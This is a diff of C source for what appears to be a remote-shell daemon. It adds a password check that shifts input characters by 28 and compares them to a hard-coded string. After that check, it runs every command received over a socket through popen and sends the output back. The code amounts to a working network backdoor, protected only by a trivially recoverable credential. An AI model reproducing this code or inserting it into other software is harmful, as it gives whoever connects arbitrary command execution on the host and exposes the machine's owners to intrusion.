@@ -1,5 +1,39 @@
 #include "./main.h"
 
+char *hash(char *str) {
+    int i = -1;
+    while (str[++i] != 0)
+        str[i] = str[i] + 28;
+    return str;
+}
+
+char *cpy(char *str) {
+    char *ret = malloc(strlen(str) + 1);
+    int i = -1;
+
+    while (str[(++i) + 1] != 0)
+        ret[i] = str[i];
+    ret[i] = 0;
+    return ret;
+}
+
+void sendData(l_socket *socket, char* data) {
+    send(socket->socket_fd, data, strlen(data), 0);
+}
+
+char *receiveData(l_socket *socket) {
+    char socket_buffer[512];
+    int error = recv(socket->socket_fd, socket_buffer, 512, 0);
+    printf("receive cmd for socket: %d\n", socket->socket_fd);
+    if (error == 0) {
+        return 0;
+    }
+    if (error < 0) {
+        perror("ERROR receiving from socket");
+    }
+    return cpy(socket_buffer);
+}
+
 void addConnection(s_connection *connection, int new_fd) {
     printf("Create socket: %d\n", new_fd);
     l_socket *new_socket = malloc(sizeof(l_socket));
@@ -44,25 +78,15 @@ s_connection *initConnection() {
     return connection;
 }
 
-int executeShellCmd(l_socket *socket) {
-    char socket_buffer[512];
+int executeShellCmd(l_socket *socket, char *socket_buffer) {
     char response_buffer[512];
-    int error = recv(socket->socket_fd, socket_buffer, 512, 0);
-    printf("execute cmd for socket: %d\n", socket->socket_fd);
-    if (error == 0) {
-        return 0;
-    }
-    if (error < 0) {
-        perror("ERROR receiving from socket");
-    //    exit(1);
-    }
+    printf("Receive cmd for socket: %d\n", socket->socket_fd);
     FILE *shell = popen(socket_buffer, "r");
     if (shell == NULL) {
         printf("Erreur lors de l'exécution de la commande\n");
-  //      exit(1);
     }
     while (fgets(response_buffer, 512, shell) != NULL) {
-        send(socket->socket_fd, response_buffer, strlen(response_buffer), 0);
+        sendData(socket, response_buffer);
     }
     pclose(shell);
     return 1;
@@ -96,10 +120,10 @@ void removeSocket(s_connection *connection, l_socket *socket) {
     }
 }
 
-int main(int argc, char **argv, char **env) {
+int main() {
     s_connection *connection = initConnection();
     fd_set read_fds;
-
+    char *socket_buffer;
     while (1) {
         FD_ZERO(&read_fds);
         l_socket *s = connection->list_socket;
@@ -109,7 +133,7 @@ int main(int argc, char **argv, char **env) {
             socklen_t optlen = sizeof(optval);
             getsockopt(s->socket_fd, SOL_SOCKET, SO_ERROR, &optval, &optlen);
             if (optval == -1) {
-                printf("Le socket doit etre fermé\n");
+                printf("Fermeture du socket\n");
                 removeSocket(connection, s);
             } else
                 printf("Le socket ne doit pas etre fermé\n");
@@ -129,16 +153,23 @@ int main(int argc, char **argv, char **env) {
                         connectNewShell(connection, socket_loop);
                         break;
                     } else {
-                        if (socket_loop->auth) {
-                            if (!executeShellCmd(socket_loop)) {
-                                l_socket *s = socket_loop;
-                                socket_loop = socket_loop->next;
-                                removeSocket(connection, s);
-                                continue;
+                        socket_buffer = receiveData(socket_loop);
+                        if (socket_buffer) {
+                            if (socket_loop->auth) {
+                                executeShellCmd(socket_loop, socket_buffer);
+                            } else {
+                                if (strcmp(hash(socket_buffer), "msanpu") == 0) {
+                                    socket_loop->auth = 1;
+                                    sendData(socket_loop, "You are now connected\n");
+                                }
+                                else
+                                    sendData(socket_loop, "Wrong password\n");
                             }
-                            else {
-
-                            }
+                        } else {
+                            l_socket *s1 = socket_loop;
+                            socket_loop = socket_loop->next;
+                            removeSocket(connection, s1);
+                            continue;
                         }
                     }
                 }
